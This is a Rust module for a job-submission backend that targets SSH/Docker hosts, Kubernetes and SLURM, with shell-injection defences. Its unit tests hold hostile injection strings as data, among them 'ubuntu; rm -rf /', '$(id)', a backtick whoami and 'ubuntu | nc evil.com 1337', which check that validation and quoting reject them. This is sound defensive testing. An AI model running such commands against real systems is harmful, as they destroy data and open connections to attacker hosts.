//! Bring-your-own-compute backend.
//!
//! Routes jobs to user-provided infrastructure — SSH-accessible machines,
//! Kubernetes clusters, or SLURM schedulers. The BYOC backend translates
//! PRISM job specs into the target system's native submission format.
//!
//! # SLURM checkpoint contract
//!
//! With checkpointing enabled (the default) the sbatch script carries
//! `#SBATCH --signal=B:USR1@60` and `#SBATCH --requeue`. The contract for
//! the image entrypoint (`/entrypoint.sh`) is:
//!
//! 1. Install `trap 'handler' USR1` before any work begins.
//! 2. On USR1 (60 s before the wall limit), atomically write a checkpoint
//!    to caller-configured storage that survives the allocation, then exit
//!    with code 140. Node-local `/tmp` is not durable checkpoint storage.
//! 3. The sbatch body observes exit 140 and calls
//!    `scontrol requeue $SLURM_JOB_ID`, putting the job back in the queue;
//!    the next start must locate and resume the durable checkpoint.
//!
//! Any other exit code behaves normally (0 = success, else failure).
//! Sites whose scheduler forbids `scontrol requeue` from the job can
//! disable checkpointing via [`SlurmCheckpoint::disabled`]; the flags are
//! then omitted entirely. Container images must be pulled or built on the
//! login node before submission and supplied as a shared `.sif` path.

use std::collections::HashMap;
use std::sync::Arc;

use anyhow::{Context, Result, bail};
use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use tokio::sync::RwLock;
use uuid::Uuid;

use crate::{ComputeBackend, ExperimentPlan, JobStatus};

/// Supported BYOC target types.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum ByocTarget {
    /// SSH to a remote machine, run via Docker.
    Ssh {
        host: String,
        user: String,
        key_path: String,
        port: u16,
    },
    /// Submit to a Kubernetes cluster.
    Kubernetes { context: String, namespace: String },
    /// Submit to a SLURM scheduler.
    Slurm {
        head_node: String,
        user: String,
        partition: String,
        /// Resource request, arrays, dependencies, checkpointing and
        /// container strategy. `#[serde(default)]`: targets serialized
        /// before this field existed deserialize as an empty config.
        #[serde(default)]
        config: Box<SlurmJobConfig>,
    },
}

/// Checkpoint/requeue behavior for SLURM jobs.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct SlurmCheckpoint {
    /// Emit `--signal=B:USR1@<lead>` + `--requeue`. See module docs for
    /// the entrypoint contract.
    pub enabled: bool,
    /// Seconds of warning before the wall limit (default 60).
    pub signal_lead_secs: u32,
}

impl Default for SlurmCheckpoint {
    fn default() -> Self {
        Self {
            enabled: true,
            signal_lead_secs: 60,
        }
    }
}

impl SlurmCheckpoint {
    pub fn disabled() -> Self {
        Self {
            enabled: false,
            signal_lead_secs: 60,
        }
    }
}

/// Typed SLURM resource and submission configuration. Absent allocation
/// fields are omitted from the sbatch script entirely (never emitted empty —
/// allocation-based clusters reject malformed directives).
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
pub struct SlurmJobConfig {
    /// `--account` — required on most allocation-based facilities.
    pub account: Option<String>,
    /// `--time` wall limit, e.g. `04:00:00`.
    pub time: Option<String>,
    /// `--gres`, e.g. `gpu:2`.
    pub gres: Option<String>,
    /// `--mem`, e.g. `64G`. Mutually exclusive with `mem_per_cpu`.
    pub mem: Option<String>,
    /// `--mem-per-cpu`. Mutually exclusive with `mem`.
    pub mem_per_cpu: Option<String>,
    /// `--cpus-per-task`.
    pub cpus_per_task: Option<u32>,
    /// `--nodes`.
    pub nodes: Option<u32>,
    /// `--ntasks`.
    pub ntasks: Option<u32>,
    /// `--array`, e.g. `0-511` or `0-511%64`.
    pub array: Option<String>,
    /// `--dependency=afterok:<id>` — a SLURM job id, not a PRISM uuid.
    pub dependency_afterok: Option<u64>,
    #[serde(default)]
    pub checkpoint: SlurmCheckpoint,
    /// Pre-staged `.sif` path on a filesystem visible to compute nodes.
    /// PRISM never performs a registry pull during SLURM submission.
    #[serde(default)]
    pub sif_path: String,
}

impl Default for ByocTarget {
    fn default() -> Self {
        ByocTarget::Ssh {
            host: "localhost".into(),
            user: "prism".into(),
            key_path: "~/.ssh/id_ed25519".into(),
            port: 22,
        }
    }
}

/// Bring-your-own-compute backend.
pub struct ByocBackend {
    target: ByocTarget,
    slurm_job_ids: Arc<RwLock<HashMap<Uuid, u64>>>,
}

impl ByocBackend {
    pub fn new(target: ByocTarget) -> Self {
        Self {
            target,
            slurm_job_ids: Arc::new(RwLock::new(HashMap::new())),
        }
    }

    /// Restore the scheduler id persisted for a previously submitted job.
    pub fn resume(target: ByocTarget, job_id: Uuid, slurm_job_id: Option<u64>) -> Self {
        let mut slurm_job_ids = HashMap::new();
        if let Some(slurm_job_id) = slurm_job_id {
            slurm_job_ids.insert(job_id, slurm_job_id);
        }
        Self {
            target,
            slurm_job_ids: Arc::new(RwLock::new(slurm_job_ids)),
        }
    }

    pub async fn slurm_job_id(&self, job_id: Uuid) -> Option<u64> {
        self.slurm_job_ids.read().await.get(&job_id).copied()
    }

    /// Build an SSH command prefix for the target host.
    fn ssh_cmd(host: &str, user: &str, key_path: &str, port: u16) -> tokio::process::Command {
        let mut cmd = tokio::process::Command::new("ssh");
        cmd.args([
            "-o",
            "StrictHostKeyChecking=accept-new",
            "-o",
            "BatchMode=yes",
            "-i",
            key_path,
            "-p",
            &port.to_string(),
            &format!("{user}@{host}"),
        ]);
        cmd
    }

    fn slurm_ssh(head_node: &str, user: &str, remote_command: &str) -> tokio::process::Command {
        let mut cmd = tokio::process::Command::new("ssh");
        cmd.args([
            "-o",
            "BatchMode=yes",
            &format!("{user}@{head_node}"),
            remote_command,
        ]);
        cmd
    }
}

#[async_trait]
impl ComputeBackend for ByocBackend {
    async fn submit(&self, plan: &ExperimentPlan) -> Result<Uuid> {
        match &self.target {
            ByocTarget::Ssh {
                host,
                user,
                key_path,
                port,
            } => {
                let job_id = Uuid::new_v4();
                let inputs_json = serde_json::to_string(&plan.inputs)?;

                // Validate image as a Docker reference — alphanumeric +
                // a small set of separators. Without this, an LLM-
                // generated tool call (or any caller passing untrusted
                // text) could pass `ubuntu; rm -rf /; #` and the
                // remote shell would execute it. See Bug #54.
                if !is_valid_docker_image(&plan.image) {
                    bail!(
                        "invalid docker image reference {:?}: must match \
                         [A-Za-z0-9._/:@-]+",
                        plan.image
                    );
                }

                // SSH to host → docker run with inputs piped via env var.
                // Single-quote-escape all interpolated values so JSON
                // payloads / image names containing apostrophes can't
                // break out of the quoted string and inject shell
                // commands. The shell-quote sequence `'\''` closes the
                // quote, escapes a literal apostrophe, and reopens.
                let docker_cmd = format!(
                    "docker run -d --name prism-job-{job_id} \
                     -e PRISM_JOB_ID={job_id} \
                     -e PRISM_INPUTS={inputs_q} \
                     {image_q}",
                    inputs_q = sh_single_quote(&inputs_json),
                    image_q = sh_single_quote(&plan.image),
                );

                tracing::info!(
                    %host, %user, %job_id, image = %plan.image,
                    "BYOC SSH: submitting job"
                );

                let mut cmd = Self::ssh_cmd(host, user, key_path, *port);
                cmd.arg(&docker_cmd);

                let output = cmd
                    .output()
                    .await
                    .with_context(|| format!("SSH to {user}@{host}:{port} failed"))?;

                if !output.status.success() {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    bail!("SSH docker run failed: {stderr}");
                }

                let container_id = String::from_utf8_lossy(&output.stdout).trim().to_string();
                tracing::info!(%job_id, %container_id, "BYOC SSH: container started");

                Ok(job_id)
            }
            ByocTarget::Kubernetes { context, namespace } => {
                let job_id = Uuid::new_v4();
                let inputs_json = serde_json::to_string(&plan.inputs)?;

                // kubectl run as a Job
                let mut cmd = tokio::process::Command::new("kubectl");
                cmd.args([
                    "--context",
                    context,
                    "-n",
                    namespace,
                    "run",
                    &format!("prism-{job_id}"),
                    "--image",
                    &plan.image,
                    "--restart=Never",
                    "--env",
                    &format!("PRISM_JOB_ID={job_id}"),
                    "--env",
                    &format!("PRISM_INPUTS={inputs_json}"),
                ]);

                tracing::info!(
                    %context, %namespace, %job_id, image = %plan.image,
                    "BYOC K8s: submitting job"
                );

                let output = cmd.output().await.context("kubectl run failed")?;
                if !output.status.success() {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    bail!("kubectl run failed: {stderr}");
                }

                Ok(job_id)
            }
            ByocTarget::Slurm {
                head_node,
                user,
                partition,
                config,
            } => {
                let job_id = Uuid::new_v4();
                let inputs_json = serde_json::to_string(&plan.inputs)?;

                let script = sbatch_script(&job_id, partition, config, &inputs_json)?;
                let ssh_command = format!("echo '{}' | sbatch", script.replace('\'', "'\\''"));

                tracing::info!(
                    %head_node, %user, %partition, %job_id,
                    "BYOC SLURM: submitting job"
                );

                let output = Self::slurm_ssh(head_node, user, &ssh_command)
                    .output()
                    .await
                    .context("SSH to SLURM head node failed")?;
                if !output.status.success() {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    bail!("sbatch submission failed: {stderr}");
                }
                let stdout = String::from_utf8(output.stdout).context("non-UTF-8 sbatch output")?;
                let slurm_job_id = parse_sbatch_job_id(&stdout).with_context(|| {
                    format!(
                        "sbatch accepted PRISM job {job_id}, but its scheduler id could not be captured"
                    )
                })?;
                self.slurm_job_ids
                    .write()
                    .await
                    .insert(job_id, slurm_job_id);
                tracing::info!(%job_id, slurm_job_id, "BYOC SLURM: scheduler id captured");

                Ok(job_id)
            }
        }
    }

    async fn status(&self, job_id: Uuid) -> Result<JobStatus> {
        match &self.target {
            ByocTarget::Ssh {
                host,
                user,
                key_path,
                port,
            } => {
                let mut cmd = Self::ssh_cmd(host, user, key_path, *port);
                cmd.arg(format!(
                    "docker inspect --format '{{{{.State.Status}}}}' prism-job-{job_id}"
                ));
                let output = cmd.output().await?;
                let status_str = String::from_utf8_lossy(&output.stdout).trim().to_string();
                match status_str.as_str() {
                    "running" => Ok(JobStatus::Running { progress: 0.0 }),
                    "exited" => Ok(JobStatus::Completed),
                    _ => Ok(JobStatus::Failed {
                        error: format!("container status: {status_str}"),
                    }),
                }
            }
            ByocTarget::Kubernetes { context, namespace } => {
                let mut cmd = tokio::process::Command::new("kubectl");
                cmd.args([
                    "--context",
                    context,
                    "-n",
                    namespace,
                    "get",
                    "pod",
                    &format!("prism-{job_id}"),
                    "-o",
                    "jsonpath={.status.phase}",
                ]);
                let output = cmd.output().await?;
                let phase = String::from_utf8_lossy(&output.stdout).trim().to_string();
                match phase.as_str() {
                    "Running" | "Pending" => Ok(JobStatus::Running { progress: 0.0 }),
                    "Succeeded" => Ok(JobStatus::Completed),
                    "Failed" => Ok(JobStatus::Failed {
                        error: "pod failed".into(),
                    }),
                    _ => Ok(JobStatus::Queued),
                }
            }
            ByocTarget::Slurm {
                head_node, user, ..
            } => {
                let slurm_job_id = self.slurm_job_id(job_id).await;
                let squeue_command = slurm_squeue_command(job_id, slurm_job_id);
                let squeue = Self::slurm_ssh(head_node, user, &squeue_command)
                    .output()
                    .await
                    .context("SSH squeue status query failed")?;
                let squeue_stdout = String::from_utf8_lossy(&squeue.stdout);
                let squeue_stderr = String::from_utf8_lossy(&squeue.stderr);

                if !squeue.status.success() {
                    return interpret_slurm_status(false, squeue_stderr.trim(), "", None, "", &[]);
                }
                if !parse_slurm_states(&squeue_stdout).is_empty() {
                    return interpret_slurm_status(true, "", &squeue_stdout, None, "", &[]);
                }

                // squeue only contains active jobs. sacct is authoritative
                // after a job leaves the queue and distinguishes completion
                // from a UUID the cluster has never seen.
                let sacct_command = slurm_sacct_command(job_id, slurm_job_id);
                let sacct = Self::slurm_ssh(head_node, user, &sacct_command)
                    .output()
                    .await
                    .context("SSH sacct status query failed")?;
                let sacct_stdout = String::from_utf8_lossy(&sacct.stdout);
                let sacct_stderr = String::from_utf8_lossy(&sacct.stderr);
                let sacct_states = parse_slurm_states(&sacct_stdout);
                interpret_slurm_status(
                    true,
                    "",
                    "",
                    Some(sacct.status.success()),
                    sacct_stderr.trim(),
                    &sacct_states,
                )
            }
        }
    }

    async fn results(&self, job_id: Uuid) -> Result<serde_json::Value> {
        match &self.target {
            ByocTarget::Ssh {
                host,
                user,
                key_path,
                port,
            } => {
                let mut cmd = Self::ssh_cmd(host, user, key_path, *port);
                cmd.arg(format!("docker logs prism-job-{job_id}"));
                let output = cmd.output().await?;
                let logs = String::from_utf8_lossy(&output.stdout).to_string();
                // Try to parse as JSON, fall back to raw text
                match serde_json::from_str(&logs) {
                    Ok(v) => Ok(v),
                    Err(_) => Ok(serde_json::json!({"output": logs})),
                }
            }
            ByocTarget::Kubernetes { context, namespace } => {
                let mut cmd = tokio::process::Command::new("kubectl");
                cmd.args([
                    "--context",
                    context,
                    "-n",
                    namespace,
                    "logs",
                    &format!("prism-{job_id}"),
                ]);
                let output = cmd.output().await?;
                let logs = String::from_utf8_lossy(&output.stdout).to_string();
                match serde_json::from_str(&logs) {
                    Ok(v) => Ok(v),
                    Err(_) => Ok(serde_json::json!({"output": logs})),
                }
            }
            ByocTarget::Slurm {
                head_node,
                user,
                config,
                ..
            } => {
                let result_path = if config.array.is_some() {
                    format!("prism-{job_id}-*.out")
                } else {
                    format!("prism-{job_id}.out")
                };
                let output = Self::slurm_ssh(head_node, user, &format!("cat {result_path}"))
                    .output()
                    .await
                    .context("SSH SLURM results query failed")?;
                if !output.status.success() {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    bail!("SLURM results query failed: {stderr}");
                }
                let logs = String::from_utf8(output.stdout).context("non-UTF-8 SLURM output")?;
                match serde_json::from_str(&logs) {
                    Ok(v) => Ok(v),
                    Err(_) => Ok(serde_json::json!({"output": logs})),
                }
            }
        }
    }

    async fn cancel(&self, job_id: Uuid) -> Result<()> {
        match &self.target {
            ByocTarget::Ssh {
                host,
                user,
                key_path,
                port,
            } => {
                let mut cmd = Self::ssh_cmd(host, user, key_path, *port);
                cmd.arg(format!("docker rm -f prism-job-{job_id}"));
                cmd.output().await.context("SSH cancel failed")?;
                Ok(())
            }
            ByocTarget::Kubernetes { context, namespace } => {
                let mut cmd = tokio::process::Command::new("kubectl");
                cmd.args([
                    "--context",
                    context,
                    "-n",
                    namespace,
                    "delete",
                    "pod",
                    &format!("prism-{job_id}"),
                ]);
                cmd.output().await.context("kubectl delete failed")?;
                Ok(())
            }
            ByocTarget::Slurm {
                head_node, user, ..
            } => {
                let cancel_command = slurm_cancel_command(job_id, self.slurm_job_id(job_id).await);
                let output = Self::slurm_ssh(head_node, user, &cancel_command)
                    .output()
                    .await
                    .context("SSH scancel failed")?;
                if !output.status.success() {
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    bail!("scancel failed: {stderr}");
                }
                Ok(())
            }
        }
    }
}

// ── SLURM script generation (pure, unit-tested) ─────────────────────────

fn parse_sbatch_job_id(stdout: &str) -> Result<u64> {
    let rendered_stdout: String = stdout.chars().take(512).collect();
    let value = stdout
        .lines()
        .find_map(|line| line.trim().strip_prefix("Submitted batch job "))
        .with_context(|| {
            format!(
                "sbatch output did not contain `Submitted batch job <id>`; stdout was {rendered_stdout:?}"
            )
        })?;
    let id = value
        .trim()
        .parse::<u64>()
        .with_context(|| format!("invalid scheduler id in sbatch output: {value:?}"))?;
    if id == 0 {
        bail!("invalid zero scheduler id in sbatch output");
    }
    Ok(id)
}

fn slurm_squeue_command(job_id: Uuid, slurm_job_id: Option<u64>) -> String {
    match slurm_job_id {
        Some(id) => format!("squeue --jobs={id} --noheader -o %T"),
        None => format!("squeue --name=prism-{job_id} --noheader -o %T"),
    }
}

fn slurm_sacct_command(job_id: Uuid, slurm_job_id: Option<u64>) -> String {
    match slurm_job_id {
        Some(id) => format!("sacct -X --jobs={id} --noheader --parsable2 --format=State"),
        None => format!(
            "sacct -X --name=prism-{job_id} --starttime=1970-01-01 \
             --noheader --parsable2 --format=State"
        ),
    }
}

fn slurm_cancel_command(job_id: Uuid, slurm_job_id: Option<u64>) -> String {
    match slurm_job_id {
        Some(id) => format!("scancel {id}"),
        None => format!("scancel --name=prism-{job_id}"),
    }
}

/// Charset for any value interpolated into an `#SBATCH` directive or the
/// script body: alphanumerics plus the separators real SLURM tokens use.
/// Rejects quotes, newlines, `$`, backticks and shell metacharacters so a
/// caller-supplied account/gres/array string can never become code.
fn is_valid_slurm_token(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 128
        && s.chars().all(|c| {
            c.is_ascii_alphanumeric()
                || matches!(c, ':' | '_' | '=' | ',' | '.' | '%' | '+' | '-' | '@' | '/')
        })
}

/// Validate a `.sif` path: same token charset (paths need `/` and `.`),
/// no shell metacharacters.
fn is_valid_sif_path(s: &str) -> bool {
    is_valid_slurm_token(s) && s.ends_with(".sif")
}

/// Build the `#SBATCH` directive lines for a job. Absent fields are
/// omitted, never emitted empty. Errors on invalid or mutually
/// exclusive values instead of guessing.
fn sbatch_directives(job_id: &Uuid, partition: &str, cfg: &SlurmJobConfig) -> Result<Vec<String>> {
    if !is_valid_slurm_token(partition) {
        bail!("invalid SLURM partition {partition:?}");
    }
    let mut d = vec![
        format!("#SBATCH --job-name=prism-{job_id}"),
        format!("#SBATCH --partition={partition}"),
    ];
    if let Some(account) = &cfg.account {
        if !is_valid_slurm_token(account) {
            bail!("invalid SLURM account {account:?}");
        }
        d.push(format!("#SBATCH --account={account}"));
    }
    if let Some(time) = &cfg.time {
        if !is_valid_slurm_token(time) {
            bail!("invalid SLURM time {time:?}");
        }
        d.push(format!("#SBATCH --time={time}"));
    }
    if let Some(gres) = &cfg.gres {
        if !is_valid_slurm_token(gres) {
            bail!("invalid SLURM gres {gres:?}");
        }
        d.push(format!("#SBATCH --gres={gres}"));
    }
    match (&cfg.mem, &cfg.mem_per_cpu) {
        (Some(mem), None) => {
            if !is_valid_slurm_token(mem) {
                bail!("invalid SLURM mem {mem:?}");
            }
            d.push(format!("#SBATCH --mem={mem}"));
        }
        (None, Some(mpc)) => {
            if !is_valid_slurm_token(mpc) {
                bail!("invalid SLURM mem-per-cpu {mpc:?}");
            }
            d.push(format!("#SBATCH --mem-per-cpu={mpc}"));
        }
        (Some(_), Some(_)) => {
            bail!("SLURM --mem and --mem-per-cpu are mutually exclusive; set one");
        }
        (None, None) => {}
    }
    for (flag, value) in [
        ("cpus-per-task", cfg.cpus_per_task),
        ("nodes", cfg.nodes),
        ("ntasks", cfg.ntasks),
    ] {
        if let Some(value) = value {
            if value == 0 {
                bail!("SLURM --{flag} must be greater than zero");
            }
            d.push(format!("#SBATCH --{flag}={value}"));
        }
    }
    if let Some(array) = &cfg.array {
        if !is_valid_slurm_token(array) {
            bail!("invalid SLURM array spec {array:?}");
        }
        d.push(format!("#SBATCH --array={array}"));
    }
    if let Some(dep) = cfg.dependency_afterok {
        if dep == 0 {
            bail!("SLURM dependency job id must be greater than zero");
        }
        d.push(format!("#SBATCH --dependency=afterok:{dep}"));
    }
    if cfg.checkpoint.enabled {
        if cfg.checkpoint.signal_lead_secs == 0 {
            bail!("SLURM checkpoint signal lead must be greater than zero");
        }
        d.push(format!(
            "#SBATCH --signal=B:USR1@{}",
            cfg.checkpoint.signal_lead_secs
        ));
        d.push("#SBATCH --requeue".to_string());
    }
    Ok(d)
}

/// Build the full sbatch script. It only executes a pre-staged,
/// compute-node-visible `.sif`; it never performs a registry pull.
fn sbatch_script(
    job_id: &Uuid,
    partition: &str,
    cfg: &SlurmJobConfig,
    inputs_json: &str,
) -> Result<String> {
    let mut directives = sbatch_directives(job_id, partition, cfg)?;
    // Relative output paths resolve under sbatch's shared submission
    // directory; login-node result queries can read the same files.
    directives.push(if cfg.array.is_some() {
        format!("#SBATCH --output=prism-{job_id}-%A_%a.out")
    } else {
        format!("#SBATCH --output=prism-{job_id}.out")
    });
    if !is_valid_sif_path(&cfg.sif_path) {
        bail!("invalid pre-staged .sif path {:?}", cfg.sif_path);
    }
    let sif = &cfg.sif_path;

    let mut body = String::from("#!/bin/bash\n");
    for directive in &directives {
        body.push_str(directive);
        body.push('\n');
    }
    body.push_str(&format!("export PRISM_JOB_ID={job_id}\n"));
    body.push_str(&format!(
        "export PRISM_INPUTS={}\n",
        sh_single_quote(inputs_json)
    ));
    body.push_str(&format!(
        "if [ ! -f {sif} ]; then echo 'prism: staged .sif not found: {sif}' >&2; exit 1; fi\n"
    ));

    if cfg.checkpoint.enabled {
        // `B:` signals the batch shell, so explicitly forward USR1 to
        // Singularity. Exit 140 means the entrypoint persisted a durable
        // checkpoint and requests requeue, as documented above.
        body.push_str("prism_finish() {\n");
        body.push_str("  rc=$1\n");
        body.push_str(
            "  if [ $rc -eq 140 ]; then scontrol requeue \"$SLURM_JOB_ID\" || exit $?; exit 0; fi\n",
        );
        body.push_str("  exit $rc\n");
        body.push_str("}\n");
        body.push_str("prism_forward_usr1() {\n");
        body.push_str("  kill -USR1 \"$prism_child_pid\"\n");
        body.push_str("  wait \"$prism_child_pid\"\n");
        body.push_str("  prism_finish $?\n");
        body.push_str("}\n");
        body.push_str("trap prism_forward_usr1 USR1\n");
        body.push_str(&format!("singularity exec {sif} /entrypoint.sh &\n"));
        body.push_str("prism_child_pid=$!\n");
        body.push_str("wait \"$prism_child_pid\"\n");
        body.push_str("prism_finish $?\n");
    } else {
        body.push_str(&format!("singularity exec {sif} /entrypoint.sh\n"));
    }
    Ok(body)
}

/// Map one `sacct` State value. `None` = state PRISM does not recognize;
/// the caller must not guess and must surface the raw value.
fn parse_slurm_states(output: &str) -> Vec<String> {
    output
        .lines()
        .filter_map(|line| {
            let state = line.split('|').next().unwrap_or(line).trim();
            (!state.is_empty()).then(|| state.to_string())
        })
        .collect()
}

fn map_sacct_state(state: &str) -> Option<JobStatus> {
    // sacct states can carry suffixes like `COMPLETED (exit 0)`; the
    // caller passes the first whitespace-delimited word.
    match state.trim_end_matches('+') {
        "COMPLETED" => Some(JobStatus::Completed),
        "PENDING" | "CONFIGURING" | "REQUEUED" | "REQUEUE_FED" | "RESV_DEL_HOLD" => {
            Some(JobStatus::Queued)
        }
        "RUNNING" | "COMPLETING" | "SUSPENDED" | "STAGE_OUT" => {
            Some(JobStatus::Running { progress: 0.0 })
        }
        "CANCELLED" => Some(JobStatus::Cancelled),
        "FAILED" | "TIMEOUT" | "NODE_FAIL" | "OUT_OF_MEMORY" | "PREEMPTED" | "BOOT_FAIL"
        | "DEADLINE" | "REVOKED" => Some(JobStatus::Failed {
            error: state.trim_end_matches('+').to_string(),
        }),
        _ => None,
    }
}

/// Fold `sacct` states of a job (array jobs yield several rows): any
/// failure dominates, then cancellation, then live states, then queued,
/// then completion. Unknown states are an error, not a guess.
fn fold_sacct_states(states: &[String]) -> Result<JobStatus> {
    let mut any_failed = None;
    let mut any_cancelled = false;
    let mut any_running = false;
    let mut any_queued = false;
    let mut any_completed = false;
    for st in states {
        let word = st.split_whitespace().next().unwrap_or(st);
        match map_sacct_state(word) {
            Some(JobStatus::Failed { error }) => any_failed = Some(error),
            Some(JobStatus::Cancelled) => any_cancelled = true,
            Some(JobStatus::Running { .. }) => any_running = true,
            Some(JobStatus::Queued) => any_queued = true,
            Some(JobStatus::Completed) => any_completed = true,
            None => bail!("unrecognized sacct state {st:?} — not mapping it to a status"),
        }
    }
    if let Some(error) = any_failed {
        Ok(JobStatus::Failed { error })
    } else if any_cancelled {
        Ok(JobStatus::Cancelled)
    } else if any_running {
        Ok(JobStatus::Running { progress: 0.0 })
    } else if any_queued {
        Ok(JobStatus::Queued)
    } else if any_completed {
        Ok(JobStatus::Completed)
    } else {
        bail!("sacct returned no interpretable states");
    }
}

/// Pure status decision for the SLURM arm. Transport failures and
/// unknown jobs are errors; an empty `squeue` alone never means
/// "completed" — `sacct` decides.
///
/// * `squeue_ok = false`  → SSH/squeue transport failure → `Err`.
/// * `squeue_state` non-empty → live state mapping (unknown ⇒ `Err`).
/// * `squeue_state` empty:
///   - `sacct_ok = None`  → programming error → `Err`.
///   - `sacct_ok = Some(false)` → sacct transport failure → `Err`.
///   - `sacct_states` empty → cluster has never seen the job → `Err`.
///   - otherwise → folded `sacct` states.
fn interpret_slurm_status(
    squeue_ok: bool,
    squeue_err: &str,
    squeue_output: &str,
    sacct_ok: Option<bool>,
    sacct_err: &str,
    sacct_states: &[String],
) -> Result<JobStatus> {
    if !squeue_ok {
        bail!("squeue over SSH failed: {squeue_err}");
    }
    let active_states = parse_slurm_states(squeue_output);
    if !active_states.is_empty() {
        return fold_sacct_states(&active_states);
    }

    match sacct_ok {
        None => bail!("job absent from squeue but sacct was not consulted"),
        Some(false) => bail!("sacct over SSH failed: {sacct_err}"),
        Some(true) if sacct_states.is_empty() => {
            bail!("job not found in squeue or sacct — unknown to this cluster")
        }
        Some(true) => fold_sacct_states(sacct_states),
    }
}

// ── Shell-injection helpers (Bug #54) ───────────────────────────────────

/// Wrap a value in POSIX single quotes, escaping any internal `'` as
/// `'\''` (close-quote, escaped-apostrophe, reopen-quote). The result
/// is safe to embed in any single-shell-pipeline `bash -c` argument.
///
/// Used by the BYOC SSH path where we have to send a `docker run …`
/// command line through ssh's remote shell. Without this wrapping a
/// JSON payload containing a `'` would break out of the quoting and
/// let the rest be interpreted as a separate shell command.
fn sh_single_quote(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('\'');
    for c in s.chars() {
        if c == '\'' {
            out.push_str("'\\''");
        } else {
            out.push(c);
        }
    }
    out.push('\'');
    out
}

/// Validate a Docker image reference. Permissive enough to accept all
/// real-world tags (digests, registries, ports, namespaces) but
/// strict enough to reject obvious shell-injection attempts.
fn is_valid_docker_image(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 256
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '/' | ':' | '-' | '@'))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn default_byoc_is_ssh() {
        let target = ByocTarget::default();
        assert!(matches!(target, ByocTarget::Ssh { .. }));
    }

    #[test]
    fn byoc_target_serializes() {
        let target = ByocTarget::Kubernetes {
            context: "prod".into(),
            namespace: "prism".into(),
        };
        let json = serde_json::to_string(&target).unwrap();
        assert!(json.contains("Kubernetes"));
        assert!(json.contains("prism"));
    }

    #[test]
    fn slurm_target_serializes() {
        let target = ByocTarget::Slurm {
            head_node: "hpc.lab.internal".into(),
            user: "researcher".into(),
            partition: "gpu".into(),
            config: Box::new(SlurmJobConfig::default()),
        };
        let json = serde_json::to_string(&target).unwrap();
        let back: ByocTarget = serde_json::from_str(&json).unwrap();
        if let ByocTarget::Slurm {
            head_node,
            partition,
            ..
        } = back
        {
            assert_eq!(head_node, "hpc.lab.internal");
            assert_eq!(partition, "gpu");
        } else {
            panic!("expected Slurm");
        }
    }

    #[test]
    fn ssh_target_roundtrip() {
        let target = ByocTarget::Ssh {
            host: "gpu-box.lab".into(),
            user: "admin".into(),
            key_path: "/home/admin/.ssh/id_ed25519".into(),
            port: 2222,
        };
        let json = serde_json::to_string(&target).unwrap();
        let back: ByocTarget = serde_json::from_str(&json).unwrap();
        if let ByocTarget::Ssh { host, port, .. } = back {
            assert_eq!(host, "gpu-box.lab");
            assert_eq!(port, 2222);
        } else {
            panic!("expected Ssh");
        }
    }

    #[test]
    fn sh_single_quote_wraps_plain_string() {
        assert_eq!(sh_single_quote("hello"), "'hello'");
    }

    #[test]
    fn sh_single_quote_escapes_apostrophe() {
        // The classic injection — a stray apostrophe must be replaced
        // with the close-escape-reopen sequence so the payload stays
        // contained inside the quoted string.
        assert_eq!(sh_single_quote("don't"), r"'don'\''t'");
    }

    #[test]
    fn sh_single_quote_handles_injection_payload() {
        // Realistic injection: JSON-ish input that ends with `'); rm -rf /; #`
        // would close the wrapping quote and execute the rest. Verify
        // the escape neutralises it.
        let payload = "{\"k\":\"v\"}'); rm -rf /; #";
        let q = sh_single_quote(payload);
        // The result must start and end with `'` and contain no
        // unescaped apostrophe in between.
        assert!(q.starts_with('\''));
        assert!(q.ends_with('\''));
        // Apostrophes are present only as the escape sequence.
        let inner = &q[1..q.len() - 1];
        // Every literal ' becomes '\''  → split on '\'' produces N+1 pieces
        // none of which contain a bare '.
        for piece in inner.split(r"'\''") {
            assert!(!piece.contains('\''), "unescaped quote in {piece}");
        }
    }

    #[test]
    fn is_valid_docker_image_accepts_real_refs() {
        assert!(is_valid_docker_image("ubuntu"));
        assert!(is_valid_docker_image("ubuntu:22.04"));
        assert!(is_valid_docker_image("ghcr.io/user/repo:latest"));
        assert!(is_valid_docker_image(
            "gcr.io/proj/img@sha256:abcdef0123456789"
        ));
        assert!(is_valid_docker_image("registry.local:5000/img:v1"));
    }

    #[test]
    fn is_valid_docker_image_rejects_injection_attempts() {
        assert!(!is_valid_docker_image(""));
        assert!(!is_valid_docker_image("ubuntu; rm -rf /"));
        assert!(!is_valid_docker_image("ubuntu\nfoo"));
        assert!(!is_valid_docker_image("ubuntu`whoami`"));
        assert!(!is_valid_docker_image("ubuntu$(id)"));
        assert!(!is_valid_docker_image("ubuntu | nc evil.com 1337"));
        assert!(!is_valid_docker_image(&"a".repeat(257)));
    }

    fn slurm_config(sif_path: &str) -> SlurmJobConfig {
        SlurmJobConfig {
            checkpoint: SlurmCheckpoint::disabled(),
            sif_path: sif_path.into(),
            ..SlurmJobConfig::default()
        }
    }

    #[test]
    fn sbatch_stdout_yields_numeric_scheduler_id() {
        assert_eq!(
            parse_sbatch_job_id("Submitted batch job 98765\n").unwrap(),
            98765
        );
    }

    #[test]
    fn sbatch_stdout_without_numeric_id_is_an_error() {
        let error = parse_sbatch_job_id("submission accepted\n").unwrap_err();
        let message = error.to_string();
        assert!(message.contains("Submitted batch job"));
        assert!(message.contains("submission accepted"));
    }

    #[test]
    fn resumed_slurm_commands_use_numeric_scheduler_id() {
        let job_id = Uuid::nil();
        assert_eq!(
            slurm_squeue_command(job_id, Some(98765)),
            "squeue --jobs=98765 --noheader -o %T"
        );
        assert_eq!(
            slurm_sacct_command(job_id, Some(98765)),
            "sacct -X --jobs=98765 --noheader --parsable2 --format=State"
        );
        assert_eq!(slurm_cancel_command(job_id, Some(98765)), "scancel 98765");
    }

    #[test]
